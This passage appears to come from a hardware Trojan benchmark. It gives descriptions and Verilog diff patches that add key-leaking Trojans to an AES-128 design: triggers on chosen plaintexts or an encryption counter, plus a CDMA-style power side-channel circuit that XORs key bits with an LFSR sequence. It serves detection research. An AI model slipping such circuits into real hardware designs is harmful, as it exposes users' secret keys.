+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	wire Tj_Trig;
+	aes_128 AES (clk, state, key, out); 
+	Trojan_Trigger Trigger (rst, state, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, Capacitance); 
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t800/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t800/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg State0, State1, State2, State3;
+	
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			State0 &lt;= 0;
+			State1 &lt;= 0;
+			State2 &lt;= 0;
+			State3 &lt;= 0; 
+		end else if (state == 128&apos;h3243f6a8_885a308d_313198a2_e0370734) begin
+			State0 &lt;= 1;
+		end else if ((state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) &amp;&amp; (State0 == 1)) begin
+			State1 &lt;= 1;
+		end else if ((state == 128&apos;h0) &amp;&amp; (State1 == 1)) begin
+			State2 &lt;= 1;
+		end else if ((state == 128&apos;h1) &amp;&amp; (State2 == 1)) begin
+			State3 &lt;= 1;
+		end
+	end
+
+	always @(State0, State1, State2, State3)
+	begin
+		Tj_Trig &lt;= State0 &amp; State1 &amp; State2 &amp; State3;
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t800/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t800/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,112 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+	 input Tj_Trig, 
+    input [127:0] key,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, Tj_Trig, counter);
+	always @ (posedge clk)
+		begin
+			if (rst == 1) begin
+				load &lt;= 0;
+			end else begin	
+				load[0] &lt;= key[0] ^ counter[0];	
+				load[1] &lt;= key[0] ^ counter[0];	
+				load[2] &lt;= key[0] ^ counter[0];	
+				load[3] &lt;= key[0] ^ counter[0];	
+				load[4] &lt;= key[0] ^ counter[0];	
+				load[5] &lt;= key[0] ^ counter[0];	
+				load[6] &lt;= key[0] ^ counter[0];	
+				load[7] &lt;= key[0] ^ counter[0];	
+				
+				load[8] &lt;= key[1] ^ counter[1];	
+				load[9] &lt;= key[1] ^ counter[1];	
+				load[10] &lt;= key[1] ^ counter[1];	
+				load[11] &lt;= key[1] ^ counter[1];	
+				load[12] &lt;= key[1] ^ counter[1];	
+				load[13] &lt;= key[1] ^ counter[1];	
+				load[14] &lt;= key[1] ^ counter[1];	
+				load[15] &lt;= key[1] ^ counter[1];	
+				
+				load[16] &lt;= key[2] ^ counter[2];	
+				load[17] &lt;= key[2] ^ counter[2];	
+				load[18] &lt;= key[2] ^ counter[2];	
+				load[19] &lt;= key[2] ^ counter[2];	
+				load[20] &lt;= key[2] ^ counter[2];	
+				load[21] &lt;= key[2] ^ counter[2];	
+				load[22] &lt;= key[2] ^ counter[2];	
+				load[23] &lt;= key[2] ^ counter[2];	
+				
+				load[24] &lt;= key[3] ^ counter[3];	
+				load[25] &lt;= key[3] ^ counter[3];	
+				load[26] &lt;= key[3] ^ counter[3];	
+				load[27] &lt;= key[3] ^ counter[3];	
+				load[28] &lt;= key[3] ^ counter[3];	
+				load[29] &lt;= key[3] ^ counter[3];	
+				load[30] &lt;= key[3] ^ counter[3];				
+				load[31] &lt;= key[3] ^ counter[3];				
+
+				load[32] &lt;= key[4] ^ counter[4];	
+				load[33] &lt;= key[4] ^ counter[4];	
+				load[34] &lt;= key[4] ^ counter[4];	
+				load[35] &lt;= key[4] ^ counter[4];	
+				load[36] &lt;= key[4] ^ counter[4];	
+				load[37] &lt;= key[4] ^ counter[4];	
+				load[38] &lt;= key[4] ^ counter[4];	
+				load[39] &lt;= key[4] ^ counter[4];	
+
+				load[40] &lt;= key[5] ^ counter[5];	
+				load[41] &lt;= key[5] ^ counter[5];	
+				load[42] &lt;= key[5] ^ counter[5];	
+				load[43] &lt;= key[5] ^ counter[5];	
+				load[44] &lt;= key[5] ^ counter[5];	
+				load[45] &lt;= key[5] ^ counter[5];	
+				load[46] &lt;= key[5] ^ counter[5];				
+				load[47] &lt;= key[5] ^ counter[5];				
+
+				load[48] &lt;= key[6] ^ counter[6];	
+				load[49] &lt;= key[6] ^ counter[6];				
+				load[50] &lt;= key[6] ^ counter[6];	
+				load[51] &lt;= key[6] ^ counter[6];	
+				load[52] &lt;= key[6] ^ counter[6];	
+				load[53] &lt;= key[6] ^ counter[6];	
+				load[54] &lt;= key[6] ^ counter[6];	
+				load[55] &lt;= key[6] ^ counter[6];
+				
+				load[56] &lt;= key[7] ^ counter[7];	
+				load[57] &lt;= key[7] ^ counter[7];	
+				load[58] &lt;= key[7] ^ counter[7];	
+				load[59] &lt;= key[7] ^ counter[7];	
+				load[60] &lt;= key[7] ^ counter[7];	
+				load[61] &lt;= key[7] ^ counter[7];	
+				load[62] &lt;= key[7] ^ counter[7];	
+				load[63] &lt;= key[7] ^ counter[7];				
+			end
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="d036b1b3-7a5a-4b1e-a05b-b17145189f1f" name="t900" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	After each 128'hFFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF_FFFF encryptions, the Trojan gets activated and leaks the secret 
	key from a cryptographic chip  running the AES algorithm through a covert channel. The channel adapts the concepts 
	from spread spectrum communications (also known as Code-Division Multiple Access (CDMA)) to distribute the leakage 
	of single bits over many clock cycles. The Trojan employs this method by using a pseudo-random number generator (PRNG) 
	to create a CDMA code sequence, the PRNG initialized to a predefined value. The code sequence is then used to 
	XOR modulate the secret information bits. The modulated sequence is forwarded to a leakage circuit (LC) to set up 
	a covert CDMA channel in the power side-channel. The LC is realized by connecting eight identical flip-flop elements 
	to the single output of the XOR gate to mimic a large capacitance [1]. 


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t900/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t900/lfsr_counter.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,24 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t900/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t900/lfsr.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,24 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t900/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t900/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t900/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t900/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,83 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Capacitance(Capacitance)
+	);
+
+	initial begin		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        #10;
+        state = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        #10;
+        state = 128&apos;h1;
+        #220;
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t900/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t900/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,35 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	wire Tj_Trig;
+	aes_128 AES (clk, state, key, out); 
+	Trojan_Trigger Trigger (rst, out, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, Capacitance); 
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t900/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t900/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,50 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] out,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg [127:0] Counter;
+	
+	always @(rst, out)
+	begin
+		if (rst == 1) begin
+			Counter &lt;= 0;
+		end else begin
+			Counter &lt;= Counter + 1;
+		end
+	end
+
+	always @(rst, Counter)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0;
+		end else if (Counter == 128&apos;hffff_ffff_ffff_ffff_ffff_ffff_ffff_ffff) begin
+			Tj_Trig &lt;= 1;
+		end else begin
+			Tj_Trig &lt;= 0;		
+		end
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t900/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t900/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,112 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+	 input Tj_Trig, 
+    input [127:0] key,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, Tj_Trig, counter);
+	always @ (posedge clk)
+		begin
+			if (rst == 1) begin
+				load &lt;= 0;
+			end else begin	
+				load[0] &lt;= key[0] ^ counter[0];	
+				load[1] &lt;= key[0] ^ counter[0];	
+				load[2] &lt;= key[0] ^ counter[0];	
+				load[3] &lt;= key[0] ^ counter[0];	
+				load[4] &lt;= key[0] ^ counter[0];	
+				load[5] &lt;= key[0] ^ counter[0];	
+				load[6] &lt;= key[0] ^ counter[0];	
+				load[7] &lt;= key[0] ^ counter[0];	
+				
+				load[8] &lt;= key[1] ^ counter[1];	
+				load[9] &lt;= key[1] ^ counter[1];	
+				load[10] &lt;= key[1] ^ counter[1];	
+				load[11] &lt;= key[1] ^ counter[1];	
+				load[12] &lt;= key[1] ^ counter[1];	
+				load[13] &lt;= key[1] ^ counter[1];	
+				load[14] &lt;= key[1] ^ counter[1];	
+				load[15] &lt;= key[1] ^ counter[1];	
+				
+				load[16] &lt;= key[2] ^ counter[2];	
+				load[17] &lt;= key[2] ^ counter[2];	
+				load[18] &lt;= key[2] ^ counter[2];	
+				load[19] &lt;= key[2] ^ counter[2];	
+				load[20] &lt;= key[2] ^ counter[2];	
+				load[21] &lt;= key[2] ^ counter[2];	
+				load[22] &lt;= key[2] ^ counter[2];	
+				load[23] &lt;= key[2] ^ counter[2];	
+				
+				load[24] &lt;= key[3] ^ counter[3];	
+				load[25] &lt;= key[3] ^ counter[3];	
+				load[26] &lt;= key[3] ^ counter[3];	
+				load[27] &lt;= key[3] ^ counter[3];	
+				load[28] &lt;= key[3] ^ counter[3];	
+				load[29] &lt;= key[3] ^ counter[3];	
+				load[30] &lt;= key[3] ^ counter[3];				
+				load[31] &lt;= key[3] ^ counter[3];				
+
+				load[32] &lt;= key[4] ^ counter[4];	
+				load[33] &lt;= key[4] ^ counter[4];	
+				load[34] &lt;= key[4] ^ counter[4];	
+				load[35] &lt;= key[4] ^ counter[4];	
+				load[36] &lt;= key[4] ^ counter[4];	
+				load[37] &lt;= key[4] ^ counter[4];	
+				load[38] &lt;= key[4] ^ counter[4];	
+				load[39] &lt;= key[4] ^ counter[4];	
+
+				load[40] &lt;= key[5] ^ counter[5];	
+				load[41] &lt;= key[5] ^ counter[5];	
+				load[42] &lt;= key[5] ^ counter[5];	
+				load[43] &lt;= key[5] ^ counter[5];	
+				load[44] &lt;= key[5] ^ counter[5];	
+				load[45] &lt;= key[5] ^ counter[5];	
+				load[46] &lt;= key[5] ^ counter[5];				
+				load[47] &lt;= key[5] ^ counter[5];				
+
+				load[48] &lt;= key[6] ^ counter[6];	
+				load[49] &lt;= key[6] ^ counter[6];				
+				load[50] &lt;= key[6] ^ counter[6];	
+				load[51] &lt;= key[6] ^ counter[6];	
+				load[52] &lt;= key[6] ^ counter[6];	
+				load[53] &lt;= key[6] ^ counter[6];	
+				load[54] &lt;= key[6] ^ counter[6];	
+				load[55] &lt;= key[6] ^ counter[6];
+				
+				load[56] &lt;= key[7] ^ counter[7];	
+				load[57] &lt;= key[7] ^ counter[7];	
+				load[58] &lt;= key[7] ^ counter[7];	
+				load[59] &lt;= key[7] ^ counter[7];	
+				load[60] &lt;= key[7] ^ counter[7];	
+				load[61] &lt;= key[7] ^ counter[7];	
+				load[62] &lt;= key[7] ^ counter[7];	
+				load[63] &lt;= key[7] ^ counter[7];				
+			end
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="2f94b71f-79e6-4e43-abd1-38e4237f7b83" name="t1000" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Whenever a predefined input plaintext is observed, the Trojan leaks the secret key from a cryptographic chip running 
	the AES algorithm through a covert channel. The channel adapts the concepts from spread spectrum communications 
	(also known as Code-Division Multiple Access (CDMA)) to distribute the leakage of single bits over many clock cycles. 
	The Trojan employs this method by using a pseudo-random number generator (PRNG) to create a CDMA code sequence, 
	the PRNG initialized to the input plaintext. The code sequence is then used to XOR modulate the secret information bits. 
	The modulated sequence is forwarded to a leakage circuit (LC) to set up a covert CDMA channel in the power side-channel. 
	The LC is realized by connecting eight identical flip-flop elements to the single output of the XOR gate to mimic 
	a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t1000/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1000/lfsr_counter.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,27 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end else begin
+				lfsr_stream &lt;= lfsr_stream ;
+			end
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t1000/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1000/lfsr.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,27 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end else begin
+				lfsr_stream &lt;= lfsr_stream ;
+			end
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t1000/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1000/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Capacitance(Capacitance)
+	);
+
+	initial begin		clk = 0;
+		state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t1000/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1000/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,35 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	wire Tj_Trig;
+	aes_128 AES (clk, state, key, out); 
+	Trojan_Trigger Trigger (rst, state, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t1000/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1000/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,38 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0; 
+		end else if (state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) begin 
+			Tj_Trig &lt;= 1; 
+		end 
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t1000/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t1000/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,109 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+	 input Tj_Trig, 
+    input [127:0] key,
+	 input [127:0] data,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, Tj_Trig, data, counter);
+	always @ (posedge clk)
+		begin
+			load[0] &lt;= key[0] ^ counter[0];	
+			load[1] &lt;= key[0] ^ counter[0];	
+			load[2] &lt;= key[0] ^ counter[0];	
+			load[3] &lt;= key[0] ^ counter[0];	
+			load[4] &lt;= key[0] ^ counter[0];	
+			load[5] &lt;= key[0] ^ counter[0];	
+			load[6] &lt;= key[0] ^ counter[0];	
+			load[7] &lt;= key[0] ^ counter[0];	
+			
+			load[8] &lt;= key[1] ^ counter[1];	
